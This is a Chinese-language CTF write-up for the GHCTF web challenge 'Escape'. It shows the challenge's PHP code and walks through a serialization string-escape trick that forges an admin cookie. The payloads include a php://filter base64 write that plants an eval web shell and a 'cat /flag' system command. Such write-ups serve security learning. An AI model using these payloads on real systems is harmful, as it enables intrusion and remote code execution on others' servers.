---
layout: post
title: "ctf-webphp反序列化逃逸-GHCTF-Escape"
date: 2025-03-12 17:21:41 +0800
description: "随便注册一个进去,能写入文件。"
keywords: "ctf-web:php反序列化逃逸 -- GHCTF Escape！"
categories: ['未分类']
tags: ['网络安全', 'Php']
artid: "146210171"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146210171
    alt: "ctf-webphp反序列化逃逸-GHCTF-Escape"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146210171
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146210171
cover: https://bing.ee123.net/img/rand?artid=146210171
image: https://bing.ee123.net/img/rand?artid=146210171
img: https://bing.ee123.net/img/rand?artid=146210171
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     ctf-web:php反序列化逃逸 -- GHCTF Escape！
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h2>
     <a id="step_1__0">
     </a>
     step 1 寻找利用点
    </h2>
    <p>
     随便注册一个进去,能写入文件
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span>  
<span class="token keyword">function</span> <span class="token function-definition function">checkSignedCookie</span><span class="token punctuation">(</span><span class="token variable">$cookieName</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'user_token'</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fake_secretkey'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token comment">// 获取 Cookie 内容  </span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token variable">$cookieName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token variable">$cookieName</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
  
        <span class="token comment">// 解码并分割数据和签名  </span>
        <span class="token variable">$decodedToken</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$serializedData</span><span class="token punctuation">,</span> <span class="token variable">$providedSignature</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$decodedToken</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token comment">// 重新计算签名  </span>
        <span class="token variable">$calculatedSignature</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$serializedData</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token comment">// 比较签名是否一致  </span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$calculatedSignature</span> <span class="token operator">===</span> <span class="token variable">$providedSignature</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
            <span class="token comment">// 签名验证通过，返回序列化的数据  </span>
            <span class="token keyword">return</span> <span class="token variable">$serializedData</span><span class="token punctuation">;</span>  <span class="token comment">// 反序列化数据  </span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>  
            <span class="token comment">// 签名验证失败  </span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token comment">// 如果没有 Cookie}  </span>
  
<span class="token comment">// 示例：验证并读取 Cookie$userData = checkSignedCookie();  </span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$userData</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token comment">#echo $userData;  </span>
    <span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$userData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token comment">#var_dump($user);  </span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">isadmin</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>  
        <span class="token variable">$tmp</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tmp/admin.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token keyword">echo</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>  
  
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php exit; ?&gt;'</span><span class="token punctuation">;</span>  
       <span class="token variable">$content</span> <span class="token operator">.=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
       <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
    <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>  
        <span class="token variable">$tmp</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tmp/admin.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">echo</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>  
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token operator">||</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1&gt;权限不足，写入失败&lt;h1&gt;"</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'token验证失败'</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>
</code></pre>
    <h2>
     <a id="step_2_admin_60">
     </a>
     step 2 寻找伪造admin的方法
    </h2>
    <p>
     漏洞点出现在这里
    </p>
    <pre><code class="prism language-php"><span class="token variable">$User</span><span class="token operator">=</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$SQL</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
<span class="token variable">$User_ser</span><span class="token operator">=</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$User</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
<span class="token function">setSignedCookie</span><span class="token punctuation">(</span><span class="token variable">$User_ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: dashboard.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <pre><code class="prism language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>  
<span class="token punctuation">{<!-- --></span>  
    <span class="token variable">$lists</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sleep"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"and"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"||"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"select"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"union"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$lists</span> <span class="token keyword">as</span> <span class="token variable">$list</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>  
        <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$list</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
    <span class="token comment">#echo $c;  </span>
    <span class="token keyword">return</span> <span class="token variable">$c</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>
</code></pre>
    <p>
     waf会将序列化后的内容替换为error,这是一个test用户应该有的序列化后的字符串
    </p>
    <pre><code>O:4:"User":2:{s:8:"username";s:4:"test";s:7:"isadmin";b:0;}
</code></pre>
    <p>
     但是如果有用户叫
    </p>
    <pre><code>";s:7:"isadmin";b:0;}
</code></pre>
    <p>
     他序列化后的数据就是
    </p>
    <pre><code>O:4:"User":2:{s:8:"username";s:21:"";s:7:"isadmin";b:0;}";s:7:"isadmin";b:0;}
</code></pre>
    <p>
     我们要伪造isadmin为1
    </p>
    <pre><code>";s:7:"isadmin";b:1;}
</code></pre>
    <p>
     接下来利用
     <code>
      '
     </code>
     将一个字符变为五个,也就是多出四个字符,我们需要想办法对其齐
     <code>
      s:21
     </code>
     ,但是21不能被4整除,我们还得配合其他字符
    </p>
    <pre><code>'''''flag";s:7:"isadmin";b:1;}
</code></pre>
    <p>
     序列化后的内容会从
    </p>
    <pre><code>O:4:"User":2:{s:8:"username";s:30:"'''''flag";s:7:"isadmin";b:1;}";s:7:"isadmin";b:0;}
</code></pre>
    <p>
     变成
    </p>
    <pre><code>O:4:"User":2:{s:8:"username";s:30:"errorerrorerrorerrorerrorerror";s:7:"isadmin";b:1;}";s:7:"isadmin";b:0;}
</code></pre>
    <p>
     即可成功伪造admin
    </p>
    <h2>
     <a id="step_3_shell_130">
     </a>
     step 3 文件写入拿shell
    </h2>
    <p>
     使用伪协议
     <code>
      filter
     </code>
     写和base64解码特性卡掉后面的东西
    </p>
    <pre><code>&lt;?php eval($_POST[123])?&gt;
</code></pre>
    <pre><code>filename=php://filter/convert.base64-decode/resource=./shell.php&amp;txt=aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==
</code></pre>
    <p>
     后端和
     <code>
      &lt;?php exit; ?&gt;
     </code>
     拼上就是
    </p>
    <pre><code>&lt;?php exit; ?&gt;aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==
</code></pre>
    <p>
     base64解码后是
    </p>
    <pre><code>¦^Æ+Z&lt;?php eval($_POST[123])?&gt;
</code></pre>
    <p>
     然后post获取flag即可
    </p>
    <pre><code>123=system('cat /flag');
</code></pre>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f672e:6373646e2e6e65742f77656978696e5f35393136363535372f:61727469636c652f64657461696c732f313436323130313731" class_="artid" style="display:none">
 </p>
</div>


